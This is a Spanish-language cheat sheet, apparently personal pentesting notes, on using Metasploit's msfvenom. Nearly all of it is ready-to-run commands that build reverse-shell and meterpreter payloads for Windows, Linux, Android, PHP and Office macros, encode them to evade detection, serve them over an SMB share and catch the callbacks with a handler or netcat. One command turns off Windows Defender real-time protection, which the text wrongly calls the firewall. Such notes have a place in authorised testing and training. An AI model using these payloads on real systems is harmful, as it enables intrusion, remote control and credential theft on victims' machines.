# Msfvenom

Msfvenom es una herramienta de Metasploit para crear payloads personalizados que pueden ejecutarse en la máquina víctima.

Para mostrar los payloads disponibles:

```shell
msfvenom -l payloads 
```

## Tipos:
- **Staged**: Envía el código malicioso en múltiples etapas para evitar la detección. A veces no puede usarse directamente con msfvenom, pero sí con Metasploit.

- **Stageless**: Envía todo el código de una vez. Puede ser detectado, pero se puede usar con msfvenom.

Para ver las opciones de un payload específico, usa la opción `-p` seguida de `--list-options`:

```shell
msfvenom -p windows/adduser --list-options
```

Usa la opción `-f` para especificar el formato de salida:

```shell
msfvenom -p windows/adduser -f exe -o adduser.exe
```

Desactiva el Firewall de Windows en la máquina víctima con:

```shell
Set-MpPreference -disableRealtimeMonitoring $true
```

Comparte el archivo usando "impacket-smbserver", compartiendo el directorio actual:

```shell
impacket-smbserver share ./
```

Si la conexión falla, intenta forzar un nombre de usuario y contraseña:

```shell
impacket-smbserver share ./ -smb2support -username test -password test
```

Conéctate desde Windows usando el cuadro de diálogo "Ejecutar":

```shell
\\<ip kali>\share
```

## Shell inverso sin etapas para Windows

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=8001 -f exe -o shellp8001.exe
```

Escucha en Kali con netcat:

```shell
nc -lvnp 8001
```

## Ejemplos adicionales

```shell
# Crear un payload básico
msfvenom -p [payload] LHOST=[IPAtacante] LPORT=[PuertoEscucha]

# Crear un payload codificado
msfvenom -p [payload] -e [encoder] -f [FormatoSalida] -i [iteración] > ArchivoResultante

# Crear un payload usando una plantilla
msfvenom -p [payload] -x [Plantilla] -f [FormatoSalida] > ArchivoResultante

# Escuchar conexiones en Metasploit:
msf6> use exploit/multi/handler
msf6> set payload windows/meterpreter/reverse_tcp
msf6> set lhost [IP]
msf6> set lport [Puerto]
msf6> set ExitOnSession false
msf6> exploit -j
```

### Ejemplos interesantes 

#### Payload para capturar credenciales en Windows
```shell
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f exe > credstealer.exe
```

#### Payload para Linux con shell inverso
```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f elf > shell.elf
```

#### Payload para inyección en macros de Office
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f vba > macro.vba
```

#### Payload para Android
```shell
msfvenom -p android/meterpreter/reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] R > appmaliciosa.apk
```

#### Payload para PHP
```shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f raw > shell.php
```

#### Payload para evitar caracteres problemáticos para buffer overfload
```shell
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f c -e x86/shikata_ga_nai -b "\x00\x0A\x0D"
```